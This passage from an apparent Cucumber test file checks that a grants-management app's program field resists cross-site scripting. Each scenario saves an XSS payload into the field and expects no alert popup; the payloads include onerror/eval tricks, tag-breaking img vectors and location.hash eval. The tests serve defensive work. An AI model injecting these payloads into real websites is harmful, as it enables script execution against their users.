      | <audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302170 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                   | Field                  |
      | <body onwheel=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302171 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                 | Field                  |
      | <noembed><img title="</noembed><img src onerror=alert(1)>"></noembed> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302172 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                    | Field                  |
      | <noscript><img title="</noscript><img src onerror=alert(1)>"></noscript> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302174 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                           | Field                  |
      | <style><img title="</style><img src onerror=alert(1)>"></style> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302175 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                              | Field                  |
      | <script><img title="</script><img src onerror=alert(1)>"></script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302176 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                              | Field                  |
      | <iframe><img title="</iframe><img src onerror=alert(1)>"></iframe> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302177 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                  |
      | <xmp><img title="</xmp><img src onerror=alert(1)>"></xmp> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302179 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                    | Field                  |
      | <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302182 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                    | Field                  |
      | <noframes><img title="</noframes><img src onerror=alert(1)>"></noframes> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302183 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                           | Field                  |
      | <title><img title="</title><img src onerror=alert(1)>"></title> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302184 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                                            | Field                  |
      | <input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302185 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                  | Field                  |
      | <script>onerror=alert;throw 1</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302186 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                   | Field                  |
      | <script>{onerror=alert}throw 1</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302187 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                  | Field                  |
      | <script>throw onerror=alert,1</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302188 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                 | Field                  |
      | <script>throw onerror=eval,'=alert\x281\x29'</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302189 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                | Field                  |
      | <script>throw onerror=eval,'alert\x281\x29'</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302190 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                 | Field                  |
      | <script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302191 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                        | Field                  |
      | <script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302202 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                     | Field                  |
      | <script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302206 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                             | Field                  |
      | <script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302207 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
